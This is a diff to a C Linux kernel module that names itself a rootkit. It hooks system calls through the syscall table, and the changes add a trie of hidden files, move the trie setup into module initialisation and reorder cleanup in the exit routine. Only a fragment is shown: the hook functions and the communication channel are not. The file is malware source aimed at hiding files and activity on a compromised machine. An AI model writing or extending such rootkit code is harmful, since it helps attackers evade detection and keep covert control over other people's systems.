@@ -10,7 +10,8 @@
 #include <linux/fs_struct.h>
 #include <linux/sched.h>
 
-#include "communicate.c"
+#include "communicate.h"
+#include "hidden_files_trie.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Anon");
@@ -378,6 +379,8 @@ static int __init rootkit_init(void) {
         *hooks_arr[i].handle = hook_syscall(hooks_arr[i].hook_func, hooks_arr[i].syscall_index, sys_call_table_addr);
     }
 
+    trie = create_trie();
+
     /*
     // hook open
 //    open_hook = hook_syscall(new_open, __NR_open, sys_call_table_addr);
@@ -409,7 +412,7 @@ static int __init rootkit_init(void) {
 
 extern struct trie *trie;
 
-void exit_my_module() {
+void exit_my_module(void) {
     static bool exited = false;
     if (exited)
         return;
@@ -418,6 +421,9 @@ void exit_my_module() {
     for (int i = 0; i < ARRAY_SIZE(hooks_arr); i++) {
         unhook_syscall(*hooks_arr[i].handle, sys_call_table_addr);
     }
+
+    if (trie != 0)
+        free_trie(trie);
 
     /*
     // unhook open
@@ -446,9 +452,6 @@ void exit_my_module() {
 */
 
     close_my_channel();
-
-    if (trie != 0)
-        free_trie(trie);
 }
 
 static void __exit rootkit_exit(void) {
